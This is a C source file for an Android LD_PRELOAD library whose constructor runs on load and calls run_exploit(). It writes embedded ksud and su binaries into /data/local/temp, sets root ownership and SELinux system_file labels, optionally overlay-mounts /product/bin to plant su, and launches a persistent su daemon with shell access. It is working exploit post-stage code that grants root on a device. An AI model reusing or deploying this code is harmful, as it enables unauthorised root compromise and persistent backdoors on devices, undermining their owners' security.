#include "common.h"
#include <stdarg.h>
#include <sys/mount.h>

extern const unsigned char embedded_ksud_start[];
extern const unsigned char embedded_ksud_end[];
extern const unsigned char embedded_su_start[];
extern const unsigned char embedded_su_end[];

#define KS_DEV_DIR "/data/local/temp"
#define KSUD_DEFAULT_DST KS_DEV_DIR "/ksud"
#define KSUD_DEFAULT_LOG KS_DEV_DIR "/ksud.preload.log"
#define SU_DST KS_DEV_DIR "/su"
#define SU_PID_PATH KS_DEV_DIR "/su.pid"
#define SU_LOG_PATH KS_DEV_DIR "/su.log"

static char ksud_dst_path[320] = KSUD_DEFAULT_DST;
static char ksud_log_path[320] = KSUD_DEFAULT_LOG;
static char ksud_package_name[160] = "me.weishu.kernelsu";
static int ksud_use_late_load = 1;
static int ksud_allow_shell = 1;
static int ksud_skip_write = 0;
static int ksud_stage_early = 0;
static int ksud_config_ready = 0;

static int tmp_path_ok(const char *path) {
  if (!path || strlen(path) >= sizeof(ksud_dst_path)) {
    return 0;
  }
  return strncmp(path, KS_DEV_DIR "/", sizeof(KS_DEV_DIR)) == 0 ||
         strncmp(path, "/data/local/tmp/", 16) == 0;
}

static const char *ksud_dst_dir(void) {
  const char *dst = ksud_dst_path;
  if (strncmp(dst, KS_DEV_DIR "/", sizeof(KS_DEV_DIR)) == 0) {
    return KS_DEV_DIR;
  }
  if (strncmp(dst, "/data/local/tmp/", 16) == 0) {
    return "/data/local/tmp";
  }
  return NULL;
}

static int env_enabled(const char *name, int default_value) {
  const char *value = getenv(name);
  if (!value || !value[0]) {
    return default_value;
  }
  return strcmp(value, "0") != 0 && strcasecmp(value, "false") != 0 &&
         strcasecmp(value, "no") != 0;
}

static void set_ksud_log_path_from_dst(void) {
  size_t dst_len = strlen(ksud_dst_path);
  if (dst_len + 4 < sizeof(ksud_log_path)) {
    memcpy(ksud_log_path, ksud_dst_path, dst_len);
    memcpy(ksud_log_path + dst_len, ".log", 5);
  }
}

void prepare_ksud_status_log(void) {
  if (ksud_config_ready) {
    return;
  }

  const char *dst = getenv("KSUD_DST");
  if (tmp_path_ok(dst)) {
    snprintf(ksud_dst_path, sizeof(ksud_dst_path), "%s", dst);
  }

  set_ksud_log_path_from_dst();
  const char *configured_log = getenv("KSUD_LOG");
  if (tmp_path_ok(configured_log) &&
      strlen(configured_log) < sizeof(ksud_log_path)) {
    snprintf(ksud_log_path, sizeof(ksud_log_path), "%s", configured_log);
  }

  ksud_use_late_load = env_enabled("KSUD_LATE_LOAD", 1);
  ksud_allow_shell = env_enabled("KSUD_ALLOW_SHELL", 1);
  ksud_skip_write = env_enabled("KSUD_SKIP_WRITE", 0);
  ksud_stage_early = env_enabled("KSUD_STAGE_EARLY", 0);
  const char *package = getenv("KSUD_PACKAGE");
  if (package && package[0] && strlen(package) < sizeof(ksud_package_name)) {
    snprintf(ksud_package_name, sizeof(ksud_package_name), "%s", package);
  }

  ksud_config_ready = 1;
}

void ksud_status_note(const char *fmt, ...) {
  int fd = open(ksud_log_path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC,
                0644);
  if (fd < 0) {
    return;
  }
  (void)fchmod(fd, 0666);

  char buf[1536];
  int off = snprintf(buf, sizeof(buf), "pid=%d uid=%u euid=%u: ", getpid(),
                     getuid(), geteuid());
  if (off < 0) {
    close(fd);
    return;
  }
  if ((size_t)off >= sizeof(buf)) {
    off = (int)sizeof(buf) - 1;
  }

  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(buf + off, sizeof(buf) - (size_t)off, fmt, ap);
  va_end(ap);
  if (n < 0) {
    close(fd);
    return;
  }
  size_t len = (size_t)off + (size_t)n;
  if (len >= sizeof(buf)) {
    len = sizeof(buf) - 1;
    buf[len++] = '\n';
  }
  const char *p = buf;
  while (len) {
    ssize_t wrote = write(fd, p, len);
    if (wrote < 0 && errno == EINTR) {
      continue;
    }
    if (wrote <= 0) {
      break;
    }
    p += wrote;
    len -= (size_t)wrote;
  }
  close(fd);
}

static int write_full(int fd, const void *buf, size_t len) {
  const unsigned char *p = buf;
  while (len) {
    ssize_t n = write(fd, p, len);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    p += n;
    len -= (size_t)n;
  }
  return 1;
}

static int try_chcon(const char *path) {
  pid_t pid = fork();
  if (pid == 0) {
    unsetenv("LD_PRELOAD");
    execl("/system/bin/chcon", "chcon", "u:object_r:system_file:s0",
          path, (char *)NULL);
    _exit(127);
  }
  if (pid > 0) {
    int status = 0;
    pid_t waited;
    do {
      waited = waitpid(pid, &status, 0);
    } while (waited < 0 && errno == EINTR);
    if (waited != pid) {
      return 0;
    }
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
  }
  return 0;
}

static int write_embedded_ksud_file(const char *dir, const char *dst) {
  char tmp[256];
  snprintf(tmp, sizeof(tmp), "%s/.ksud.new.%d", dir, getpid());
  unlink(tmp);

  size_t size = (size_t)(embedded_ksud_end - embedded_ksud_start);
  ksud_status_note("write begin dst=%s tmp=%s bytes=%zu\n", dst, tmp, size);
  int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (fd < 0) {
    ksud_status_note("write open failed tmp=%s errno=%d\n", tmp, errno);
    pr_error("embedded ksud open %s failed errno=%d\n", tmp, errno);
    return 0;
  }
  int ok = write_full(fd, embedded_ksud_start, size);
  int saved_errno = errno;
  if (ok) {
    fchown(fd, 0, 0);
    ok = fchmod(fd, 0755) == 0;
    saved_errno = errno;
  }
  if (close(fd) != 0 && ok) {
    ok = 0;
    saved_errno = errno;
  }
  if (!ok) {
    ksud_status_note("write/chown/chmod failed tmp=%s errno=%d\n", tmp, saved_errno);
    pr_error("embedded ksud write/chown/chmod %s failed errno=%d\n", tmp, saved_errno);
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }

  int tmp_chcon_ok = try_chcon(tmp);
  ksud_status_note("chcon tmp path=%s ok=%d errno=%d\n", tmp, tmp_chcon_ok,
                   errno);
  if (rename(tmp, dst) != 0) {
    saved_errno = errno;
    ksud_status_note("rename failed tmp=%s dst=%s errno=%d\n", tmp, dst,
                     saved_errno);
    pr_error("embedded ksud rename %s -> %s failed errno=%d\n", tmp, dst, saved_errno);
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }
  int dst_chcon_ok = try_chcon(dst);
  ksud_status_note("chcon dst path=%s ok=%d errno=%d\n", dst, dst_chcon_ok,
                   errno);
  ksud_status_note("write complete dst=%s bytes=%zu\n", dst, size);
  pr_success("embedded ksud wrote %zu bytes to %s\n", size, dst);
  return 1;
}

static pid_t start_ksud_late_load(const char *path, int use_late_load,
                                  int allow_shell, const char *package) {
  int exec_pipe[2] = {-1, -1};
  if (pipe2(exec_pipe, O_CLOEXEC) != 0) {
    ksud_status_note("exec status pipe failed errno=%d\n", errno);
    return -1;
  }

  pid_t pid = fork();
  if (pid == 0) {
    close(exec_pipe[0]);
    setsid();
    int null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
    if (null_fd >= 0) {
      dup2(null_fd, STDIN_FILENO);
    }

    int log_fd = open(ksud_log_path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC,
                      0644);
    if (log_fd >= 0) {
      dup2(log_fd, STDOUT_FILENO);
      dup2(log_fd, STDERR_FILENO);
      if (log_fd > STDERR_FILENO) {
        close(log_fd);
      }
    }

    if (use_late_load) {
      setenv("KSU_LATE_LOAD", "1", 1);
      if (allow_shell) {
        if (package && package[0]) {
          execl(path, "ksud", "late-load", "--allow-shell", "--package-name",
                package, (char *)NULL);
        }
        execl(path, "ksud", "late-load", "--allow-shell", (char *)NULL);
      } else if (package && package[0]) {
        execl(path, "ksud", "late-load", "--package-name", package,
              (char *)NULL);
      } else {
        execl(path, "ksud", "late-load", (char *)NULL);
      }
    } else {
      execl(path, "ksud", "--daemon", (char *)NULL);
    }
    int saved_errno = errno;
    (void)write(exec_pipe[1], &saved_errno, sizeof(saved_errno));
    _exit(127);
  }

  close(exec_pipe[1]);
  if (pid <= 0) {
    close(exec_pipe[0]);
    return pid;
  }

  int exec_errno = 0;
  ssize_t result;
  do {
    result = read(exec_pipe[0], &exec_errno, sizeof(exec_errno));
  } while (result < 0 && errno == EINTR);
  close(exec_pipe[0]);
  if (result == (ssize_t)sizeof(exec_errno)) {
    errno = exec_errno;
    ksud_status_note("ksud exec failed pid=%d errno=%d\n", pid, exec_errno);
    return -1;
  }
  if (result < 0) {
    ksud_status_note("ksud exec status read failed pid=%d errno=%d\n", pid,
                     errno);
    return -1;
  }

  return pid;
}

int install_embedded_ksud(void) {
  const char *dst = ksud_dst_path;
  const char *dir = ksud_dst_dir();
  if (!dir) {
    ksud_status_note("invalid dst=%s\n", dst);
    errno = EINVAL;
    return 0;
  }

  const char *package = ksud_package_name[0] ? ksud_package_name : NULL;
  ksud_status_note("install begin dst=%s late_load=%d allow_shell=%d skip_write=%d package=%s\n",
                   dst, ksud_use_late_load, ksud_allow_shell, ksud_skip_write,
                   package ? package : "(none)");
  pr_info("embedded ksud install begin dst=%s late_load=%d allow_shell=%d skip_write=%d package=%s\n",
          dst, ksud_use_late_load, ksud_allow_shell, ksud_skip_write,
          package ? package : "(none)");

  if (ksud_skip_write) {
    if (access(dst, X_OK) != 0) {
      int saved_errno = errno;
      ksud_status_note("skip-write path not executable dst=%s errno=%d\n", dst,
                       saved_errno);
      pr_error("embedded ksud skip-write path not executable dst=%s errno=%d\n",
               dst, saved_errno);
      errno = saved_errno;
      return 0;
    }
    ksud_status_note("skip-write using existing dst=%s\n", dst);
  } else if (!write_embedded_ksud_file(dir, dst)) {
    ksud_status_note("file install failed errno=%d dst=%s\n", errno, dst);
    return 0;
  }

  pid_t pid = start_ksud_late_load(dst, ksud_use_late_load, ksud_allow_shell,
                                   package);
  if (pid <= 0) {
    ksud_status_note("launch failed pid=%d errno=%d dst=%s\n", pid, errno,
                     dst);
    return 0;
  }

  ksud_status_note("launch complete pid=%d mode=%s dst=%s\n", pid,
                   ksud_use_late_load ? "late-load" : "daemon", dst);
  pr_success("embedded ksud daemon started pid=%d path=%s\n", pid, dst);
  return 1;
}

static void su_status_note(const char *fmt, ...) {
  int fd = open(SU_LOG_PATH, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
  if (fd < 0) {
    return;
  }
  (void)fchmod(fd, 0666);

  char buf[1536];
  int off = snprintf(buf, sizeof(buf), "pid=%d uid=%u euid=%u: ", getpid(),
                     getuid(), geteuid());
  if (off < 0) {
    close(fd);
    return;
  }
  if ((size_t)off >= sizeof(buf)) {
    off = (int)sizeof(buf) - 1;
  }

  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(buf + off, sizeof(buf) - (size_t)off, fmt, ap);
  va_end(ap);
  if (n < 0) {
    close(fd);
    return;
  }
  size_t len = (size_t)off + (size_t)n;
  if (len >= sizeof(buf)) {
    len = sizeof(buf) - 1;
    buf[len++] = '\n';
  }
  const char *p = buf;
  while (len) {
    ssize_t wrote = write(fd, p, len);
    if (wrote < 0 && errno == EINTR) {
      continue;
    }
    if (wrote <= 0) {
      break;
    }
    p += wrote;
    len -= (size_t)wrote;
  }
  close(fd);
}

static int write_embedded_su_file(const char *dst) {
  char tmp[256];
  snprintf(tmp, sizeof(tmp), "%s/.su.new.%d", KS_DEV_DIR, getpid());
  unlink(tmp);

  size_t size = (size_t)(embedded_su_end - embedded_su_start);
  su_status_note("write begin dst=%s tmp=%s bytes=%zu\n", dst, tmp, size);
  int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (fd < 0) {
    su_status_note("write open failed tmp=%s errno=%d\n", tmp, errno);
    pr_warning("embedded su open %s failed errno=%d\n", tmp, errno);
    return 0;
  }
  int ok = write_full(fd, embedded_su_start, size);
  int saved_errno = errno;
  if (ok) {
    fchown(fd, 0, 0);
    ok = fchmod(fd, 0755) == 0;
    saved_errno = errno;
  }
  if (close(fd) != 0 && ok) {
    ok = 0;
    saved_errno = errno;
  }
  if (!ok) {
    su_status_note("write/chown/chmod failed tmp=%s errno=%d\n", tmp,
                   saved_errno);
    pr_warning("embedded su write/chown/chmod %s failed errno=%d\n", tmp,
               saved_errno);
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }

  int tmp_chcon_ok = try_chcon(tmp);
  if (rename(tmp, dst) != 0) {
    saved_errno = errno;
    su_status_note("rename failed tmp=%s dst=%s errno=%d\n", tmp, dst,
                   saved_errno);
    pr_warning("embedded su rename %s -> %s failed errno=%d\n", tmp, dst,
               saved_errno);
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }
  int dst_chcon_ok = try_chcon(dst);
  su_status_note("write complete dst=%s bytes=%zu chcon=%d/%d\n", dst, size,
                 tmp_chcon_ok, dst_chcon_ok);
  pr_info("embedded su wrote %zu bytes to %s\n", size, dst);
  return 1;
}

static void stop_old_su_daemon(void) {
  int fd = open(SU_PID_PATH, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  char buf[32];
  memset(buf, 0, sizeof(buf));
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return;
  }
  int old = atoi(buf);
  if (old <= 1) {
    return;
  }
  if (kill(old, 0) == 0) {
    kill(old, SIGTERM);
    for (int i = 0; i < 50; i++) {
      if (kill(old, 0) != 0) {
        break;
      }
      usleep(20000);
    }
  }
  su_status_note("stopped old daemon pid=%d alive=%d\n", old,
                 kill(old, 0) == 0);
}

static void write_su_pidfile(pid_t pid) {
  char buf[32];
  int len = snprintf(buf, sizeof(buf), "%d\n", (int)pid);
  int fd = open(SU_PID_PATH, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
  if (fd < 0) {
    su_status_note("pidfile open failed errno=%d\n", errno);
    return;
  }
  (void)write(fd, buf, (size_t)len);
  (void)fchmod(fd, 0666);
  close(fd);
}

static int path_is_mountpoint(const char *path) {
  int fd = open("/proc/self/mountinfo", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  char buf[16384];
  ssize_t total = 0;
  for (;;) {
    ssize_t n = read(fd, buf + total, sizeof(buf) - 1 - total);
    if (n <= 0) {
      break;
    }
    total += n;
    if ((size_t)total >= sizeof(buf) - 1) {
      break;
    }
  }
  close(fd);
  if (total <= 0) {
    return 0;
  }
  buf[total] = 0;

  size_t path_len = strlen(path);
  char *line = buf;
  while (line && *line) {
    char *nl = strchr(line, '\n');
    if (nl) {
      *nl = 0;
    }
    int field = 1;
    char *p = line;
    char *tok = NULL;
    size_t tok_len = 0;
    while (*p) {
      while (*p == ' ') {
        p++;
      }
      if (!*p) {
        break;
      }
      tok = p;
      while (*p && *p != ' ') {
        p++;
      }
      tok_len = (size_t)(p - tok);
      if (field == 5) {
        break;
      }
      field++;
    }
    if (field == 5 && tok_len == path_len &&
        memcmp(tok, path, path_len) == 0) {
      return 1;
    }
    line = nl ? nl + 1 : NULL;
  }
  return 0;
}

static int copy_file_mode(const char *src, const char *dst) {
  int in = open(src, O_RDONLY | O_CLOEXEC);
  if (in < 0) {
    return 0;
  }
  int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (out < 0) {
    close(in);
    return 0;
  }
  char buf[8192];
  int ok = 1;
  for (;;) {
    ssize_t n = read(in, buf, sizeof(buf));
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n < 0) {
      ok = 0;
      break;
    }
    if (n == 0) {
      break;
    }
    if (!write_full(out, buf, (size_t)n)) {
      ok = 0;
      break;
    }
  }
  close(in);
  if (close(out) != 0) {
    ok = 0;
  }
  if (ok) {
    (void)chown(dst, 0, 0);
    (void)chmod(dst, 0755);
    (void)try_chcon(dst);
  }
  return ok;
}

static const char *SU_OV_DIR = KS_DEV_DIR "/suov";

static void install_su_system_path(const char *dst) {
  const char *pb = "/product/bin";
  if (access(pb, F_OK) != 0) {
    su_status_note("system path skip: %s missing errno=%d\n", pb, errno);
    return;
  }

  if (!path_is_mountpoint(pb)) {
    char low[256];
    char tmp[256];
    char up[256];
    char wk[256];
    char opts[640];
    snprintf(low, sizeof(low), "%s/low", SU_OV_DIR);
    snprintf(tmp, sizeof(tmp), "%s/tmp", SU_OV_DIR);
    snprintf(up, sizeof(up), "%s/tmp/up", SU_OV_DIR);
    snprintf(wk, sizeof(wk), "%s/tmp/wk", SU_OV_DIR);
    (void)mkdir(SU_OV_DIR, 0755);
    (void)mkdir(low, 0755);
    (void)mkdir(tmp, 0755);

    if (!path_is_mountpoint(low) &&
        mount(pb, low, NULL, MS_BIND, NULL) != 0 &&
        errno != EBUSY) {
      su_status_note("system path low bind failed errno=%d\n", errno);
      pr_warning("su system low bind failed errno=%d\n", errno);
      return;
    }
    if (!path_is_mountpoint(tmp) &&
        mount("tmpfs", tmp, "tmpfs", 0, "mode=755") != 0 &&
        errno != EBUSY) {
      su_status_note("system path tmpfs failed errno=%d\n", errno);
      pr_warning("su system tmpfs failed errno=%d\n", errno);
      return;
    }
    (void)mkdir(up, 0755);
    (void)mkdir(wk, 0755);
    snprintf(opts, sizeof(opts),
             "context=u:object_r:system_file:s0,lowerdir=%s,upperdir=%s,workdir=%s",
             low, up, wk);
    int ov = mount("overlay", pb, "overlay", 0, opts);
    if (ov != 0 && errno != EBUSY) {
      su_status_note("system path overlay failed errno=%d\n", errno);
      pr_warning("su system overlay failed errno=%d\n", errno);
      return;
    }
    if (ov != 0) {
      su_status_note("system path overlay already present target=%s\n", pb);
    } else {
      su_status_note("system path overlay ok target=%s\n", pb);
      pr_info("su system overlay mounted on %s\n", pb);
    }
  } else {
    su_status_note("system path already mounted target=%s\n", pb);
  }

  char target[128];
  snprintf(target, sizeof(target), "%s/su", pb);
  if (!copy_file_mode(dst, target)) {
    su_status_note("system path copy failed dst=%s target=%s errno=%d\n", dst,
                   target, errno);
    pr_warning("su system copy failed errno=%d\n", errno);
    return;
  }
  su_status_note("system path installed target=%s\n", target);
  pr_success("su installed at %s\n", target);
}

int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  const char *dst = SU_DST;

  if (!env_enabled("SU_INSTALL", 1)) {
    su_status_note("disabled via SU_INSTALL=0 dst=%s\n", dst);
    errno = 0;
    return 0;
  }

  su_status_note("install begin dst=%s system_path=%d\n", dst,
                 env_enabled("SU_SYSTEM_BIND", 0));

  stop_old_su_daemon();
  if (!write_embedded_su_file(dst)) {
    su_status_note("file install failed errno=%d dst=%s\n", errno, dst);
    return 0;
  }
  if (env_enabled("SU_SYSTEM_BIND", 0)) {
    install_su_system_path(dst);
  }

  int exec_pipe[2] = {-1, -1};
  if (pipe2(exec_pipe, O_CLOEXEC) != 0) {
    su_status_note("exec status pipe failed errno=%d\n", errno);
    return 0;
  }

  pid_t pid = fork();
  if (pid == 0) {
    close(exec_pipe[0]);
    prctl(PR_SET_PDEATHSIG, 0);
    signal(SIGHUP, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    prctl(PR_SET_NAME, "ll_su_daemon");
    setsid();
    unsetenv("LD_PRELOAD");

    int log_fd = open(SU_LOG_PATH, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC,
                      0644);
    if (log_fd >= 0) {
      dup2(log_fd, STDIN_FILENO);
      dup2(log_fd, STDOUT_FILENO);
      dup2(log_fd, STDERR_FILENO);
      if (log_fd > STDERR_FILENO) {
        close(log_fd);
      }
    }

    execl(dst, "su", "--daemon", (char *)NULL);
    int saved_errno = errno;
    (void)write(exec_pipe[1], &saved_errno, sizeof(saved_errno));
    _exit(127);
  }

  close(exec_pipe[1]);
  if (pid <= 0) {
    close(exec_pipe[0]);
    su_status_note("fork failed errno=%d\n", errno);
    return 0;
  }

  int exec_errno = 0;
  ssize_t result;
  do {
    result = read(exec_pipe[0], &exec_errno, sizeof(exec_errno));
  } while (result < 0 && errno == EINTR);
  close(exec_pipe[0]);
  if (result == (ssize_t)sizeof(exec_errno)) {
    errno = exec_errno;
    su_status_note("daemon exec failed pid=%d errno=%d\n", pid, exec_errno);
    pr_warning("su daemon exec failed errno=%d\n", exec_errno);
    return 0;
  }

  write_su_pidfile(pid);
  if (daemon_pid) {
    *daemon_pid = pid;
  }
  su_status_note("daemon started pid=%d dst=%s\n", pid, dst);
  pr_success("su daemon started pid=%d path=%s\n", pid, dst);
  return 1;
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  prctl(PR_SET_NAME, "ks_preload", 0, 0, 0);

  prepare_ksud_status_log();
  ksud_status_note("preload config dst=%s log=%s late_load=%d allow_shell=%d skip_write=%d stage_early=%d package=%s\n",
                   ksud_dst_path, ksud_log_path, ksud_use_late_load,
                   ksud_allow_shell, ksud_skip_write, ksud_stage_early,
                   ksud_package_name[0] ? ksud_package_name : "(none)");

  unsetenv("LD_PRELOAD");

  if (ksud_stage_early) {
    const char *stage_dir = ksud_dst_dir();
    int stage_ok =
        stage_dir ? write_embedded_ksud_file(stage_dir, ksud_dst_path) : 0;
    ksud_status_note("early stage result ok=%d errno=%d dst=%s\n", stage_ok,
                     errno, ksud_dst_path);
    pr_info("embedded ksud early stage ok=%d errno=%d dst=%s\n", stage_ok,
            errno, ksud_dst_path);
    if (stage_ok) {
      ksud_skip_write = 1;
    }
  }

  char *argv[2] = {
    "preload.so",
    NULL,
  };

  pr_success("preload starting pid=%d\n", getpid());
  run_exploit(1, argv);
}
